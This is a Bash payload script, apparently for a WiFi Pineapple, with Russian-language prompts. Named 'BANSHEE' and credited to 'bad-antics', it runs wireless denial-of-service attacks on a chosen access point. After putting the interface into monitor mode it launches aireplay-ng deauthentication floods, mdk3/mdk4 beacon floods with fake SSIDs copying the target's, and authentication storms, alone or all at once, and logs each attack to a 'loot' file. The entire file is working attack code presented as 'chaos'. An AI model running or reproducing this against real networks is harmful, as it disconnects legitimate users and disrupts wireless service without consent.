#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# БАНШИ - Broadcast Attack Сеть Signal Harasser & Environment Eliminator
# Разработано: bad-antics
# 
# Многовекторный хаос - атакует всё одновременно воющими атаками
#═══════════════════════════════════════════════════════════════════════════════

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# В случае отсутствия подходящего интерфейса показывает диалог с ошибкой.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

PROMPT "    ╔╗ ╔═╗╔╗╔╔═╗╦ ╦╔═╗╔═╗
    ╠╩╗╠═╣║║║╚═╗╠═╣║╣ ║╣ 
    ╚═╝╩ ╩╝╚╝╚═╝╩ ╩╚═╝╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━
Беспроводной Вой

Многовекторная атака,
воющая на всех
частотах.

ВОПЛОЩЕНИЕ ХАОСА
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics
Нажмите ОК чтобы ВЫТЬ."

# Сканирование целей
nullsec_select_target
[ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "Цель не выбрана!"; exit 1; }

PROMPT "ЦЕЛЬ ЗАХВАЧЕНА:
$SELECTED_SSID

РЕЖИМЫ БАНШИ:
1. Вой (деаутентификационный флуд)
2. Визг (хаос маячков)
3. Рёв (штормы аутентификации)
4. Крик (ВСЕ атаки)

Выберите свой крик..."

MODE=$(NUMBER_PICKER "Режим (1-4):" 4)
DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)

INTERFACE="$IFACE"
airmon-ng check kill 2>/dev/null
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

iwconfig $MON_IF channel $SELECTED_CHANNEL 2>/dev/null

LOOT_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 БАНШИ - Журнал атаки
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Цель: $SELECTED_SSID ($SELECTED_BSSID)
 Канал: $SELECTED_CHANNEL
 Режим: $MODE
 Длительность: ${DURATION} с
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

LOG "БАНШИ ВОЕТ..."
SPINNER_START "Вой на $SELECTED_SSID..."

launch_wail() {
    timeout $DURATION aireplay-ng --deauth 0 -a $SELECTED_BSSID $MON_IF 2>/dev/null &
    echo "[$(date)] ВОЙ: Деаутентификационный флуд на $SELECTED_BSSID" >> "$LOOT_FILE"
}

launch_shriek() {
    # Флуд маячков с вариациями целевого SSID
    for i in {1..10}; do
        FAKE_SSID="${SELECTED_SSID:0:$((${#SELECTED_SSID}-2))}$RANDOM"
        echo "$FAKE_SSID" >> /tmp/banshee_beacons.txt
    done
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    fi
    echo "[$(date)] ВИЗГ: Запущен хаос маячков" >> "$LOOT_FILE"
}

launch_howl() {
    # Штормы аутентификации
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    fi
    echo "[$(date)] РЁВ: Шторм аутентификации на $SELECTED_BSSID" >> "$LOOT_FILE"
}

case $MODE in
    1) launch_wail ;;
    2) launch_shriek ;;
    3) launch_howl ;;
    4)
        launch_wail
        launch_shriek
        launch_howl
        ;;
esac

sleep $DURATION

SPINNER_STOP

# Подсчёт отправленных пакетов
DEAUTH_COUNT=$(grep -c "Sending DeAuth" /tmp/*.log 2>/dev/null || echo "1000+")

echo "" >> "$LOOT_FILE"
echo "[$(date)] БАНШИ умолкла через ${DURATION} с" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"
echo " NullSec Pineapple Suite | Разработано: bad-antics" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"

# Очистка
pkill -f "aireplay\|mdk" 2>/dev/null
rm -f /tmp/banshee_beacons.txt
airmon-ng stop $MON_IF 2>/dev/null

PROMPT "БАНШИ УМОЛКЛА
━━━━━━━━━━━━━━━━━━━━━━━━━
Вой прекратился.

Цель: $SELECTED_SSID
Длительность: ${DURATION} с
Режим: $MODE

Хаос выпущен.

Журнал: $LOOT_FILE
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"